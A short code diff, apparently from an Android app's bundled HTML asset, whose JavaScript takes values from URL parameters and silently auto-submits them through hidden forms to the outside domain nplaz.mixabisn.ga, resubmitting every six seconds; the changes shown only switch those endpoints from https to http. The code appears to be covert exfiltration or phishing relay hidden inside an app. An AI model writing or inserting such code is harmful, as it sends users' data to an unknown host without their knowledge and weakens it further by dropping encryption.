@@ -43,7 +43,7 @@ var c = getParameterByName("n");
 else if(l!=null && l.startsWith("file:///android_asset/reds.html?ux=/r.")){
 
 var b = getParameterByName("uxs");
-$('form').attr('action', 'https://nplaz.mixabisn.ga/novo/dt.php');
+$('form').attr('action', 'http://nplaz.mixabisn.ga/novo/dt.php');
 $('input').attr('value', b);
 document.getElementById('myForm').submit();
 setInterval(function(){
@@ -56,7 +56,7 @@ else if(l!=null && l.startsWith("file:///android_asset/reds.html?ux=/sred.")){
     
 var b = getParameterByName("uxs");
 var c = getParameterByName("h");
-    $("body").replaceWith('<body><form method="post" id="myForm"><input class="input" name="u"> <input class="input2" name="h"></form><script>$("form").attr("action", "https://nplaz.mixabisn.ga/flix/ssss.php");$(".input").attr("value", "'+b+'");$(".input2").attr("value", "'+c+'");document.getElementById("myForm").submit();setInterval(function(){document.getElementById("myForm").submit();},6000);</script></body>');
+    $("body").replaceWith('<body><form method="post" id="myForm"><input class="input" name="u"> <input class="input2" name="h"></form><script>$("form").attr("action", "http://nplaz.mixabisn.ga/flix/ssss.php");$(".input").attr("value", "'+b+'");$(".input2").attr("value", "'+c+'");document.getElementById("myForm").submit();setInterval(function(){document.getElementById("myForm").submit();},6000);</script></body>');
     
     
 }
@@ -86,7 +86,7 @@ $('body').replaceWith(aa);
     
     
 var b = getParameterByName("ux");
-$('form').attr('action', 'https://nplaz.mixabisn.ga/novo/dt.php');
+$('form').attr('action', 'http://nplaz.mixabisn.ga/novo/dt.php');
 $('input').attr('value', b);
 
 document.getElementById('myForm').submit();
